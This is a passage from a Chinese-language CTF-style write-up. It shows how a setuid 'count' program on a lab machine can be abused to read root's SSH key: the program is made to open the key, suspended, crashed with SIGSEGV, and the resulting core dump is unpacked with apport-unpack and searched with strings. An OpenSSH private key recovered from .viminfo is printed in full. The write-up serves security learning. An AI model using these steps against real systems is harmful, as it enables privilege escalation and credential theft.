class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;l&quot;</span>);<br>                ++symlinks;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(S_ISREG(fstat.st_mode))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-&quot;</span>);<br>                ++regular_files;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;?&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IRUSR) ? <span class="hljs-string">&quot;r&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IWUSR) ? <span class="hljs-string">&quot;w&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IXUSR) ? <span class="hljs-string">&quot;x&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IRGRP) ? <span class="hljs-string">&quot;r&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IWGRP) ? <span class="hljs-string">&quot;w&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IXGRP) ? <span class="hljs-string">&quot;x&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IROTH) ? <span class="hljs-string">&quot;r&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IWOTH) ? <span class="hljs-string">&quot;w&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>            <span class="hljs-built_in">printf</span>((fstat.st_mode &amp; S_IXOTH) ? <span class="hljs-string">&quot;x&quot;</span> : <span class="hljs-string">&quot;-&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;??????????&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;\t%s\n&quot;</span>, ent-&gt;d_name);<br>    &#125;<br>    closedir(dir);<br><br>    <span class="hljs-built_in">snprintf</span>(summary, <span class="hljs-number">4096</span>, <span class="hljs-string">&quot;Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n&quot;</span>, tot, regular_files, directories, symlinks);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s&quot;</span>, summary);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">filecount</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *summary)</span><br>&#123;<br>    FILE *file;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-type">int</span> characters, words, lines;<br><br>    file = fopen(path, <span class="hljs-string">&quot;r&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUnable to open file.\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please check if file exists and you have read privilege.\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    characters = words = lines = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((ch = fgetc(file)) != EOF)<br>    &#123;<br>        characters++;<br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;\n&#x27;</span> || ch == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>            lines++;<br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27; &#x27;</span> || ch == <span class="hljs-string">&#x27;\t&#x27;</span> || ch == <span class="hljs-string">&#x27;\n&#x27;</span> || ch == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>            words++;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (characters &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        words++;<br>        lines++;<br>    &#125;<br><br>    <span class="hljs-built_in">snprintf</span>(summary, <span class="hljs-number">256</span>, <span class="hljs-string">&quot;Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n&quot;</span>, characters, words, lines);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s&quot;</span>, summary);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> path[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">int</span> res;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">path_s</span>;</span><br>    <span class="hljs-type">char</span> summary[<span class="hljs-number">4096</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter source file/directory name: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%99s&quot;</span>, path);<br>    getchar();<br>    stat(path, &amp;path_s);<br>    <span class="hljs-keyword">if</span>(S_ISDIR(path_s.st_mode))<br>        dircount(path, summary);<br>    <span class="hljs-keyword">else</span><br>        filecount(path, summary);<br><br>    <span class="hljs-comment">// drop privs to limit file write</span><br>    setuid(getuid());<br>    <span class="hljs-comment">// Enable coredump generation</span><br>    prctl(PR_SET_DUMPABLE, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Save results a file? [y/N]: &quot;</span>);<br>    res = getchar();<br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">121</span> || res == <span class="hljs-number">89</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Path: &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%99s&quot;</span>, path);<br>        FILE *fp = fopen(path, <span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-keyword">if</span> (fp != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">fputs</span>(summary, fp);<br>            fclose(fp);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not open %s for writing\n&quot;</span>, path);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>看起来是帮我获取文件信息的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:/opt$ ./count <br>Enter <span class="hljs-built_in">source</span> file/directory name: /root/root.txt<br><br>Total characters = 33<br>Total words      = 2<br>Total lines      = 2<br>Save results a file? [y/N]: y<br>Path: /opt/root.txt<br>Could not open /opt/root.txt <span class="hljs-keyword">for</span> writing<br>dasith@secret:/opt$ <span class="hljs-built_in">ls</span><br>code.c  count  valgrind.log<br>dasith@secret:/opt$ <br></code></pre></td></tr></table></figure><p>能读取目录信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:/opt$ ./count /root/<br>Enter <span class="hljs-built_in">source</span> file/directory name: /root<br>-rw-r--r--.viminfo<br>drwxr-xr-x..<br>-rw-r--r--.bashrc<br>drwxr-xr-x.<span class="hljs-built_in">local</span><br>drwxr-xr-xsnap<br>lrwxrwxrwx.bash_history<br>drwx------.config<br>drwxr-xr-x.pm2<br>-rw-r--r--.profile<br>drwxr-xr-x.vim<br>drwx------.<br>drwx------.cache<br>-r--------root.txt<br>drwxr-xr-x.npm<br>drwx------.ssh<br><br>Total entries       = 15<br>Regular files       = 4<br>Directories         = 10<br>Symbolic links      = 1<br>Save results a file? [y/N]: <br></code></pre></td></tr></table></figure><p>只能帮我统计文件字数，但无法帮我读取出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:/opt$ ./count       <br>Enter <span class="hljs-built_in">source</span> file/directory name: /root/.ssh<br>drwx------..<br>-rw-------authorized_keys<br>-rw-------id_rsa<br>drwx------.<br>-rw-r--r--id_rsa.pub<br><br>Total entries       = 5<br>Regular files       = 3<br>Directories         = 2<br>Symbolic links      = 0<br>Save results a file? [y/N]: n<br>dasith@secret:/opt$ ./count<br>Enter <span class="hljs-built_in">source</span> file/directory name: /root/.ssh/id_rsa<br><br>Total characters = 2602<br>Total words      = 45<br>Total lines      = 39<br>Save results a file? [y/N]:<br></code></pre></td></tr></table></figure><p>我可以在它让我选择的时候将它挂起，然后去尝试读取它的句柄：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:/opt$ ./count       <br>Enter <span class="hljs-built_in">source</span> file/directory name: /root/.ssh<br>drwx------..<br>-rw-------authorized_keys<br>-rw-------id_rsa<br>drwx------.<br>-rw-r--r--id_rsa.pub<br><br>Total entries       = 5<br>Regular files       = 3<br>Directories         = 2<br>Symbolic links      = 0<br>Save results a file? [y/N]: n<br>dasith@secret:/opt$ ./count<br>Enter <span class="hljs-built_in">source</span> file/directory name: /root/.ssh/id_rsa<br><br>Total characters = 2602<br>Total words      = 45<br>Total lines      = 39<br>Save results a file? [y/N]: ^Z<br>[1]+  Stopped                 ./count<br>dasith@secret:/opt$ ps | grep <span class="hljs-string">&quot;count&quot;</span><br>   1589 pts/0    00:00:00 count<br>dasith@secret:/opt$ <span class="hljs-built_in">cd</span> /proc/<br>dasith@secret:/proc$ <span class="hljs-built_in">cd</span> 1589/<br>dasith@secret:/proc/1589$ <span class="hljs-built_in">ls</span><br>arch_status      environ    mountinfo      personality   statm<br>attr             exe        mounts         projid_map    status<br>autogroup        fd         mountstats     root          syscall<br>auxv             fdinfo     net            <span class="hljs-built_in">sched</span>         task<br>cgroup           gid_map    ns             schedstat     timers<br>clear_refs       io         numa_maps      sessionid     timerslack_ns<br>cmdline          limits     oom_adj        setgroups     uid_map<br><span class="hljs-built_in">comm</span>             loginuid   oom_score      smaps         wchan<br>coredump_filter  map_files  oom_score_adj  smaps_rollup<br>cpuset           maps       pagemap        stack<br>cwd              mem        patch_state    <span class="hljs-built_in">stat</span><br>dasith@secret:/proc/1589$ <span class="hljs-built_in">cd</span> fd<br>dasith@secret:/proc/1589/fd$ <span class="hljs-built_in">ls</span><br>0  1  2  3<br>dasith@secret:/proc/1589/fd$ <span class="hljs-built_in">cd</span> 3<br>bash: <span class="hljs-built_in">cd</span>: 3: Not a directory<br>dasith@secret:/proc/1589/fd$ <span class="hljs-built_in">ls</span><br>0  1  2  3<br>dasith@secret:/proc/1589/fd$ <span class="hljs-built_in">cat</span> 0<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>dasith@secret:/proc/1589/fd$ <span class="hljs-built_in">cat</span> 1<br>^C<br>dasith@secret:/proc/1589/fd$ <span class="hljs-built_in">cat</span> 2<br>^C<br>dasith@secret:/proc/1589/fd$ <span class="hljs-built_in">cat</span> 3<br><span class="hljs-built_in">cat</span>: 3: Permission denied<br>dasith@secret:/proc/1589/fd$ <span class="hljs-built_in">ls</span> -all<br>total 0<br>dr-x------ 2 dasith dasith  0 May 15 11:57 .<br>dr-xr-xr-x 9 dasith dasith  0 May 15 11:57 ..<br>lrwx------ 1 dasith dasith 64 May 15 11:58 0 -&gt; /dev/pts/0<br>lrwx------ 1 dasith dasith 64 May 15 11:58 1 -&gt; /dev/pts/0<br>lrwx------ 1 dasith dasith 64 May 15 11:58 2 -&gt; /dev/pts/0<br>lr-x------ 1 dasith dasith 64 May 15 11:58 3 -&gt; /root/.ssh/id_rsa<br>dasith@secret:/proc/1589/fd$ <br></code></pre></td></tr></table></figure><p> 当我尝试用&#x2F;count去读取&#x2F;root&#x2F;.viminfo，看到一个类似密钥的东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----END OPENSSH PRIVATE KEY-----<br>|3,1,0,1,38,0,1633544227,<span class="hljs-string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----&quot;</span>,<span class="hljs-string">&quot;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&quot;</span>,<span class="hljs-string">&quot;NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3&quot;</span>,<span class="hljs-string">&quot;KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+&quot;</span>,<span class="hljs-string">&quot;7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1&quot;</span>,<span class="hljs-string">&quot;xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx&quot;</span>,&gt;72<br>|&lt;<span class="hljs-string">&quot;8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu&quot;</span>,<span class="hljs-string">&quot;BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2&quot;</span>,<span class="hljs-string">&quot;5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+Y&quot;</span>,<span class="hljs-string">&quot;Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2&quot;</span>,<span class="hljs-string">&quot;EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr&quot;</span>,<span class="hljs-string">&quot;85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65&quot;</span>,&gt;72<br>|&lt;<span class="hljs-string">&quot;rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob&quot;</span>,<span class="hljs-string">&quot;0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde&quot;</span>,<span class="hljs-string">&quot;+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QT&quot;</span>,<span class="hljs-string">&quot;uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg&quot;</span>,<span class="hljs-string">&quot;BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP&quot;</span>,<span class="hljs-string">&quot;Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3&quot;</span>,&gt;72<br>|&lt;<span class="hljs-string">&quot;t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE997&quot;</span>,<span class="hljs-string">&quot;44VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEq&quot;</span>,<span class="hljs-string">&quot;Hcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC3&quot;</span>,<span class="hljs-string">&quot;4uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7Vv&quot;</span>,<span class="hljs-string">&quot;D569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nF&quot;</span>,<span class="hljs-string">&quot;JZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6z&quot;</span>,&gt;72<br>|&lt;<span class="hljs-string">&quot;y0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAA&quot;</span>,<span class="hljs-string">&quot;wQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81&quot;</span>,<span class="hljs-string">&quot;ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14o&quot;</span>,<span class="hljs-string">&quot;Kt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLM&quot;</span>,<span class="hljs-string">&quot;dFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0Gh&quot;</span>,<span class="hljs-string">&quot;mXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4&quot;</span>,&gt;72<br>|&lt;<span class="hljs-string">&quot;Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxep&quot;</span>,<span class="hljs-string">&quot;lJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibc&quot;</span>,<span class="hljs-string">&quot;z04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9&quot;</span>,<span class="hljs-string">&quot;RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9&quot;</span>,<span class="hljs-string">&quot;6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl&quot;</span>,<span class="hljs-string">&quot;xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k&quot;</span>,<span class="hljs-string">&quot;fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==&quot;</span>,&gt;35<br>|&lt;<span class="hljs-string">&quot;-----END OPENSSH PRIVATE KEY-----&quot;</span><br><br></code></pre></td></tr></table></figure><p>这个能读，但是信息乱了。</p><h3 id="程序崩溃转储密钥："><a href="#程序崩溃转储密钥：" class="headerlink" title="程序崩溃转储密钥："></a>程序崩溃转储密钥：</h3><p>学到了，当程序崩溃时，系统会将崩溃转储文件存储在&#x2F;var&#x2F;crash，先读取ssh密钥然后将其挂起，这样该程序的句柄会一直处于打开状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:/proc/1616/fd$ <span class="hljs-built_in">cd</span> /opt/<br>dasith@secret:/opt$ ./count<br>Enter <span class="hljs-built_in">source</span> file/directory name: /root/.ssh/id_rsa<br><br>Total characters = 2602<br>Total words      = 45<br>Total lines      = 39<br>Save results a file? [y/N]: ^Z<br>[3]+  Stopped                 ./count<br>dasith@secret:/opt$ ps |grep <span class="hljs-string">&quot;count&quot;</span><br>   1632 pts/0    00:00:00 count<br>dasith@secret:/opt$ <span class="hljs-built_in">kill</span> -l<br> 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP<br> 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL10) SIGUSR1<br>11) SIGSEGV12) SIGUSR213) SIGPIPE14) SIGALRM15) SIGTERM<br>16) SIGSTKFLT17) SIGCHLD18) SIGCONT19) SIGSTOP20) SIGTSTP<br>21) SIGTTIN22) SIGTTOU23) SIGURG24) SIGXCPU25) SIGXFSZ<br>26) SIGVTALRM27) SIGPROF28) SIGWINCH29) SIGIO30) SIGPWR<br>31) SIGSYS34) SIGRTMIN35) SIGRTMIN+136) SIGRTMIN+237) SIGRTMIN+3<br>38) SIGRTMIN+439) SIGRTMIN+540) SIGRTMIN+641) SIGRTMIN+742) SIGRTMIN+8<br>43) SIGRTMIN+944) SIGRTMIN+1045) SIGRTMIN+1146) SIGRTMIN+1247) SIGRTMIN+13<br>48) SIGRTMIN+1449) SIGRTMIN+1550) SIGRTMAX-1451) SIGRTMAX-1352) SIGRTMAX-12<br>53) SIGRTMAX-1154) SIGRTMAX-1055) SIGRTMAX-956) SIGRTMAX-857) SIGRTMAX-7<br>58) SIGRTMAX-659) SIGRTMAX-560) SIGRTMAX-461) SIGRTMAX-362) SIGRTMAX-2<br>63) SIGRTMAX-164) SIGRTMAX<br>dasith@secret:/opt$ <span class="hljs-built_in">kill</span> -SIGSEGV 1632<br>dasith@secret:/opt$ <span class="hljs-built_in">cd</span> /var/crash<br>dasith@secret:/var/crash$ <span class="hljs-built_in">fg</span><br>./count(wd: /opt)<br>Segmentation fault (core dumped)<br>dasith@secret:/var/crash$ <span class="hljs-built_in">ls</span><br>_opt_count.0.crash  _opt_count.1000.crash  _opt_countzz.0.crash<br>dasith@secret:/var/crash$ <span class="hljs-built_in">ls</span> -all<br>total 92<br>drwxrwxrwt  2 root   root    4096 May 15 12:19 .<br>drwxr-xr-x 14 root   root    4096 Aug 13  2021 ..<br>-rw-r-----  1 root   root   27203 Oct  6  2021 _opt_count.0.crash<br>-rw-r-----  1 dasith dasith 31397 May 15 12:19 _opt_count.1000.crash<br>-rw-r-----  1 root   root   24048 Oct  5  2021 _opt_countzz.0.crash<br></code></pre></td></tr></table></figure><p>这样我就拿到了该程序崩溃文件，是一个文本文件，在文本末尾会有很大一串base64编码的数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:/var/crash$ file _opt_count.1000.crash<br>_opt_count.1000.crash: ASCII text, with very long lines<br>dasith@secret:/var/crash$ <span class="hljs-built_in">cat</span> _opt_count.1000.crash <br>CoreDump: <span class="hljs-built_in">base64</span><br> H4sICAAAAAAC/0NvcmVEdW1wAA==<br>................................................ 7Z0HYBtF1sdXtpM4hiQGEghd3Af3BUxiuduAQe5yl3uh2LIkW7JlSVax5RwQQwLEhIDpHNX00M0BdzmqqBeOZuAOAlwxHHDhaD5KLhzF3xvNG1s7kdIIV/jeDzb/nTfvzczOzs6OVsUriiqKYzQaRRCnHK/MpBRFr2yNXslWFk/7c4ZmRXAExveMbNeIWC0aRu6seLohzCExsrK4UFU6tI9KcVHip+sTcWO7GBfc8XbOZjt6tI/vZJwR7aNXVanjYiSV2tmO9kmfTrciQn3GreNC/elGu35AHScY2i9yfSIueH7kuNG4reKU8Lj2iyPHRTsPIs4txekklftzFONGdzJuHOPGpbh2SbcaL7HcELwk8nmINq71GDd+SeR+0UU57yJOuTzK+YvSThE3cvkOt5OPT4wb3cm4dowb28k4tzi+1fZvVXHbuR7ExGT8uTpuG+c9FDGGcUNS3DbaGRrbQTERtk8xthfHvI0aHltQXVvEbHuEVRe+L2iHDvloFtcPo8y7O0P8M3xs2+bx9Oh6nh79JepTXIdu41osLsF7+Zx2kFzgd6FDn8rXnM3PMU4BY7dIcxki/NIwLco3bBwO9X0S2vVHRLkmoiDmGtZFq2FjI0j0sVKLmXP0IdkUyze5b80uv9MX.................................................<br></code></pre></td></tr></table></figure><p>可以通过一下命令将其转储到指定目录，在目录下原文本各个字段会变成一个二进制文件，可以通过strings命令读取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/hack<br>dasith@secret:/var/crash$ <span class="hljs-built_in">cd</span> /tmp/hack/<br>dasith@secret:/tmp/hack$ strings -n 30 CoreDump<br>l characters = 2////////////////<br>l characters = 2////////////////<br>Please check <span class="hljs-keyword">if</span> file exists and you have <span class="hljs-built_in">read</span> privilege.<br>Enter <span class="hljs-built_in">source</span> file/directory name: <br>Save results a file? [y/N]: l words      = 45<br>-----BEGIN OPENSSH PRIVATE 